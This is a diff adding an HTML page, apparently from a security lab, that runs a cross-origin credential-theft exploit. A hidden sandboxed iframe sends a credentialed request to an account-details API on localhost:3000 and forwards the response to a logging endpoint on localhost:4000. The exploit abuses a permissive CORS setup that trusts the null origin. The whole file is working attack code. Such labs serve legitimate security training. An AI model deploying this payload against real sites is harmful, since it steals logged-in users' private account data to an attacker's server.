@@ -1,0 +1,43 @@
+<!doctype html>
+
+<meta charset="utf-8">
+
+<title>Local Exploit</title>
+
+<p>
+    Running local lab exploit...
+</p>
+
+<iframe
+    sandbox="allow-scripts allow-top-navigation allow-forms"
+    srcdoc="
+        <script>
+
+            var req = new XMLHttpRequest();
+
+            req.onload = reqListener;
+
+            req.open(
+                'get',
+                'https://localhost:3000/api/accountDetails',
+                true
+            );
+
+            req.withCredentials = true;
+
+            req.send();
+
+            function reqListener() {
+
+                location =
+                    'http://localhost:4000/log?data='
+                    +
+                    encodeURIComponent(
+                        this.responseText
+                    );
+            }
+
+        </script>
+    "
+    style="display:none">
+</iframe>
